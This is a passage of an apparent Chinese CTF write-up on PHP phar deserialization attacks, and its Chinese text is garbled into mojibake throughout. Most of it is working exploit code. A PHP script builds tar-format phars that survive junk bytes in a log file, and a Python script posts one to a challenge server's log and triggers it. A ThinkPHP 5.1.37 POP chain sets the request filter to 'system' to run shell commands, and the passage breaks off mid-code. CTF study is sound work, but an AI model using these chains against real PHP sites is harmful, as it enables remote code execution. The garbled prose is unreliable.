href="https://github.dev/php/php-src">https://github.dev/php/php-src</a></p><p>å¯è§ï¼Œå¦‚æœæœ«å°¾ä¸æ˜¯GBMBä¼šç›´æ¥å¯¼è‡´è§£æå¤±è´¥ã€‚</p><p>åœ¨CTFä¸­åˆ©ç”¨è¯¥æ¼æ´éœ€è¦æˆ‘ä»¬å®Œæˆå†™å…¥&#x2F;ä¸Šä¼ pharï¼Œå¹¶è°ƒç”¨æ–‡ä»¶åŒ…å«å‡½æ•°ã€‚æˆ‘ä»¬çŸ¥é“ä¸€å¥è¯æœ¨é©¬ç”±äºæœ‰<code>&lt;?php ?&gt;</code>è¿™æ ·çš„å¤´å°¾æ ‡è¯†å­˜åœ¨ï¼Œå¯ä»¥æ— è§†å‰åè„æ•°æ®ï¼›ç„¶è€Œå¯¹äºpharï¼Œè¿™æ ·çš„éªšæ“ä½œè¢«ç­¾åéƒ¨åˆ†é˜»æ­¢äº†ã€‚æœ‰åŠæ³•ç»•è¿‡å—ï¼Ÿè¯·å‚é˜…ï¼š<a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p><p>åˆ©ç”¨convertToExecutableå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpharæ–‡ä»¶è½¬ä¸ºå…¶ä»–æ ¼å¼çš„pharæ–‡ä»¶ï¼Œä¾‹å¦‚.tarå’Œ.zipæ ¼å¼ã€‚</p><p>æˆ‘ä»¬ä»¥N1CTF easyphpä¸ºä¾‹å­ï¼Œè¿™é¢˜å…è®¸æˆ‘ä»¬å†™å…¥æ—¥å¿—ï¼Œå¹¶ä¸”å¯ä»¥åˆ©ç”¨pharååºåˆ—åŒ–å¾—åˆ°flagï¼Œéš¾ç‚¹åœ¨äºæ—¥å¿—æ–‡ä»¶å‰åæœ‰é¢å¤–è„æ•°æ®ï¼Œä¼šä½¿å¾—æˆ‘ä»¬çš„pharæ–‡ä»¶æ— æ³•è¢«è§£æã€‚</p><p>ç„¶è€Œå¦‚æœä»¥taræ ¼å¼å‚¨å­˜pharï¼Œæœ«å°¾çš„è„æ•°æ®å¹¶ä¸ä¼šå½±å“è§£æï¼ˆè¿™æ˜¯tarçš„æ ¼å¼å†³å®šçš„ï¼‰ï¼Œè€Œå¼€å¤´çš„è„æ•°æ®å¯ä»¥åœ¨åˆ¶é€ pharæ–‡ä»¶æ—¶å°±æå‰æ„é€ å¥½ï¼ˆè¿™æ ·è¿™éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šè¢«çº³å…¥ç­¾åè®¡ç®—ï¼‰ï¼Œå†™å…¥æ—¥å¿—æ—¶ä¸å¿…å†™å…¥è¿™éƒ¨åˆ†ï¼Œè€Œæ˜¯ä»¤å…¶ä¸è„æ•°æ®æ‹¼æ¥å½¢æˆåˆæ³•çš„pharã€‚exploitå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">CLASS FLAG &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;FLAG: &quot;</span> . <span class="variable language_">$this</span>-&gt;_flag;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$sb</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sb&#x27;</span>];</span><br><span class="line">    <span class="variable">$ts</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ts&#x27;</span>];</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="variable">$sb</span>.<span class="string">&quot;.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    **<span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>); <span class="comment">//ä¼šç”Ÿæˆ*.phar.tar**</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;Time: &quot;</span>.<span class="variable">$ts</span>.<span class="string">&quot; IP: [], REQUEST: [log_type=&quot;</span>.<span class="variable">$sb</span>.<span class="string">&quot;], CONTENT: [&quot;</span>, <span class="string">&quot;&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//taræ–‡ä»¶å¼€å¤´æ˜¯ç¬¬ä¸€ä¸ªæ·»åŠ æ–‡ä»¶çš„çš„æ–‡ä»¶åï¼Œæ³¨æ„æ·»åŠ çš„æ–‡ä»¶é¡ºåºä¸è¦é”™äº†</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FLAG</span>();</span><br><span class="line"><span class="variable">$o</span> -&gt; data = <span class="string">&#x27;g0dsp3ed_1s_g0D&#x27;</span>;</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠè¿™ä¸ªè·‘åœ¨æœ¬åœ°webæœåŠ¡ä¸Šï¼Œç„¶åå†™ä¸ªè„šæœ¬ï¼ˆå½“æ—¶åŠå¤œèµ¶åˆ¶çš„å¾ˆä¸‘ä¼šç•™ä¸‹ä¸€äº›åƒåœ¾æ–‡ä»¶ æ±‚è½»å–· é˜Ÿé‡Œå¸ˆå‚…å†™çš„å¹²å‡€å¤šäº†ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> rq</span><br><span class="line"><span class="keyword">import</span> json </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">ip = <span class="string">&#x27;&lt;here_is_remote_ip&gt;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_str</span>(<span class="params">randomlength=<span class="number">16</span></span>):</span><br><span class="line">  <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">  ç”Ÿæˆä¸€ä¸ªæŒ‡å®šé•¿åº¦çš„éšæœºå­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">  &quot;&quot;&quot;</span></span><br><span class="line">  random_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  base_str = <span class="string">&#x27;ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789&#x27;</span></span><br><span class="line">  length = <span class="built_in">len</span>(base_str) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(randomlength):</span><br><span class="line">    random_str += base_str[random.randint(<span class="number">0</span>, length)]</span><br><span class="line">  <span class="keyword">return</span> random_str</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_one</span>(<span class="params">offset</span>):</span><br><span class="line">    rd = generate_random_str(<span class="number">4</span>)</span><br><span class="line">    ts2 = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()+offset))</span><br><span class="line">    ts = time.strftime(<span class="string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span>,time.localtime(time.time()))</span><br><span class="line">    res = rq.get(url=<span class="string">f&quot;http://127.0.0.1/test.php?sb=<span class="subst">&#123;rd&#125;</span>&amp;ts=<span class="subst">&#123;ts2&#125;</span>&quot;</span>)  <span class="comment"># è®¿é—®æœ¬åœ°ç”Ÿæˆphar</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;<span class="subst">&#123;rd&#125;</span>.phar.tar&#x27;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f: </span><br><span class="line">        data = f.read()</span><br><span class="line">    data = data[<span class="number">70</span>::]<span class="comment">#å»æ‰å‰é¢çš„å†—ä½™éƒ¨åˆ†ä»¥ä¾¿å’Œlogå‰é¢æ‹¼æ¥å½¢æˆåˆæ³•*.phar.tar</span></span><br><span class="line">    headers = &#123;<span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form&#x27;</span>&#125;  <span class="comment"># æºæ–‡æœ¬</span></span><br><span class="line">    res = rq.post(url=<span class="string">f&quot;http://43.155.59.185:53340/log.php?log_type=<span class="subst">&#123;rd&#125;</span>&quot;</span>,data=data)  <span class="comment"># å†™å…¥æ—¥å¿—</span></span><br><span class="line">    res = rq.post(url=<span class="string">f&quot;http://43.155.59.185:53340?file=phar://./log/<span class="subst">&#123;ip&#125;</span>/<span class="subst">&#123;rd&#125;</span>_www.log&quot;</span>)  <span class="comment"># ååºåˆ—åŒ–</span></span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(-<span class="number">30</span>,<span class="number">30</span>):<span class="comment">#è€ƒè™‘æœ¬åœ°å’Œè¿œç¨‹çš„æ—¶é—´å·®å¼‚ï¼Œè¿™è¾¹è®¾ç½®ä¸ª30sçš„çª—å£æœŸ</span></span><br><span class="line">    new_one(i)</span><br><span class="line">    time.sleep(<span class="number">0.9</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;ç”Ÿæˆçš„æ–‡ä»¶é•¿è¿™æ ·ï¼ˆçœ‹ä¸ªå¼€å¤´å°±è¡Œï¼‰</span></span><br><span class="line"><span class="string">00000000: 5469 6d65 3a20 3230 3231 2d31 312d 3232  Time: 2021-11-22</span></span><br><span class="line"><span class="string">00000010: 2030 363a 3533 3a31 3520 4950 3a20 5b5d   06:53:15 IP: []</span></span><br><span class="line"><span class="string">00000020: 2c20 5245 5155 4553 543a 205b 5d2c 2043  , REQUEST: [], C</span></span><br><span class="line"><span class="string">00000030: 4f4e 5445 4e54 3a20 5b5f 5f5f 5f5f 5f5f  ONTENT: [_______</span></span><br><span class="line"><span class="string">00000040: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class="line"><span class="string">00000050: 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f 5f5f  ________________</span></span><br><span class="line"><span class="string">00000060: 5f5f 5f5f 3030 3030 3634 3400 0000 0000  ____0000644.....</span></span><br><span class="line"><span class="string">00000070: 0000 0000 0000 0000 0000 0000 3030 3030  ............0000</span></span><br><span class="line"><span class="string">00000080: 3030 3030 3032 3400 3134 3134 3636 3337  0000024.14146637</span></span><br><span class="line"><span class="string">00000090: 3133 3300 3030 3233 3534 3320 3000 0000  133.0023543 0...</span></span><br><span class="line"><span class="string">000000a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ä¸åªæ˜¯tarï¼Œè¿˜æœ‰åˆ«çš„æ ¼å¼ï¼š</p><p><img src="https://img2020.cnblogs.com/blog/1335480/202111/1335480-20211128132908415-691764041.png"><br><a href="https://www.php.net/manual/zh/phar.converttoexecutable.php">https://www.php.net/manual/zh/phar.converttoexecutable.php</a></p><p>å¯¹åº”çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>,<span class="title class_">Phar</span>::<span class="variable constant_">BZ2</span>);<span class="comment">//ä¼šç”Ÿæˆxxxx.phar.tar.bz2</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">TAR</span>,<span class="title class_">Phar</span>::<span class="variable constant_">GZ</span>);<span class="comment">//ä¼šç”Ÿæˆxxxx.phar.tar.gz</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">convertToExecutable</span>(<span class="title class_">Phar</span>::<span class="variable constant_">ZIP</span>);<span class="comment">//ä¼šç”Ÿæˆxxxx.phar.zip</span></span><br></pre></td></tr></table></figure><hr><h3 id="POPé“¾"><a href="#POPé“¾" class="headerlink" title="POPé“¾"></a><strong>POPé“¾</strong></h3><p>POP(property oriented programming)ï¼Œè¯´ç™½äº†å°±æ˜¯ç»è¿‡ä¸€è¿ä¸²çš„é­”æœ¯æ–¹æ³•&#x2F;ç‰¹æ®Šæ–¹æ³•è°ƒç”¨è¾¾åˆ°ç‰¹å®šç›®çš„çš„ä¸€ç§æ”»å‡»æ–¹å¼ï¼Œæœ¬è´¨æ˜¯é€šè¿‡åœ¨è°ƒç”¨è¿™äº›æ–¹æ³•çš„è¿‡ç¨‹ä¸­åˆè§¦å‘äº†åˆ«çš„ç‰¹æ®Šæ–¹æ³•ï¼Œå¼•å‘è¿é”ååº”ç›´åˆ°è§¦åŠç›®æ ‡ã€‚pharååºåˆ—åŒ–ä½¿å¾—ä¸å­˜åœ¨unserilizeå‡½æ•°æ—¶è¿™æ ·çš„æ”»å‡»ä¹Ÿèƒ½æˆåŠŸï¼Œè¿™æ­£æ˜¯æ‰€è°“â€œæ‰©å¤§æ”»å‡»é¢â€ã€‚æˆ‘ä»¬ä»¥åˆšåˆšç»“æŸçš„å®‰æ´µæ¯2021 EZ_TPä¸ºä¾‹å­ã€‚</p><p>ç½‘ç«™ä½¿ç”¨ThinkPHP V5.1.37ï¼Œç½‘ä¸Šå·²æœ‰ç°æˆçš„<a href="https://blog.csdn.net/lllffg/article/details/116145918">POPé“¾</a>ï¼Œç°åœ¨éœ€è¦æˆ‘ä»¬åœ¨æ²¡æœ‰unserilizeå‡½æ•°çš„æƒ…å†µä¸‹å®Œæˆååºåˆ—åŒ–æ”»å‡»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12è½½åˆå¿ƒä¸æ”¹ï¼ˆ2006-2018ï¼‰ - ä½ å€¼å¾—ä¿¡èµ–çš„PHPæ¡†æ¶&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="variable">$hello</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;Welcome to D0g3&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>])||<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;hello&#x27;</span>])) <span class="keyword">exit</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">parse_str</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;world&#x27;</span>],<span class="variable">$haha</span>);</span><br><span class="line">            <span class="title function_ invoke__">extract</span>(<span class="variable">$haha</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">            <span class="variable">$a</span> = <span class="string">&#x27;hello.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$hello</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;hello.txt&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$a</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>parse_str()å’Œextract()ä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡å˜é‡è¦†ç›–å®Œæˆæ–‡ä»¶å†™å…¥ä¸ä»»æ„è¯»å–ï¼Œå¹¶ä¸”$aå¯ä»¥ä½¿ç”¨ä¼ªåè®®ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥çš„äº‹æƒ…å°±ç†æ‰€åº”å½“äº†ï¼šå¾€hello.txté‡Œå†™å…¥ä¸€ä¸ªpharï¼Œmetadataé‡Œé¢æ”¾ThinkPHP 5.1.37 çš„ååºåˆ—åŒ–åˆ©ç”¨é“¾ï¼Œå®ŒæˆRCE.(å…³äºè¿™ä¸ªPOPé“¾çš„åŸç†è¯·å‚é˜…<a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Thinkphp-5.1.37-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-ååºåˆ—åŒ–æ¼æ´/Thinkphp-5.1.37-ååºåˆ—åŒ–æ¼æ´.html</a> è®²çš„å¾ˆè¯¦ç»†)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>&#123;</span><br><span class="line">    <span class="title class_">abstract</span> <span class="title class_">class</span> <span class="title class_">Model</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">append</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append = [<span class="string">&quot;ethan&quot;</span>=&gt;[<span class="string">&quot;godspeedyyds&quot;</span>,<span class="string">&quot;xtxyyds&quot;</span>]];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data = [<span class="string">&quot;ethan&quot;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Request</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">            <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [</span><br><span class="line">                <span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;REDIRECT_URL&#x27;</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$param</span> = [<span class="string">&#x27;cat /y0u_f0und_It&#x27;</span>];</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="variable language_">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>\<span class="title class_">Conversion</span>;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">Model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>\<span class="title class_">Windows</span>;</span><br><span class="line">    <span class="variable">$w</span> = <span class="keyword">new</span> <span class="title class_">Windows</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;phar.phar&#x27;</span>);</span><br><span class="line">    <span class="variable">$p</span>-&gt;<span class="title function_ 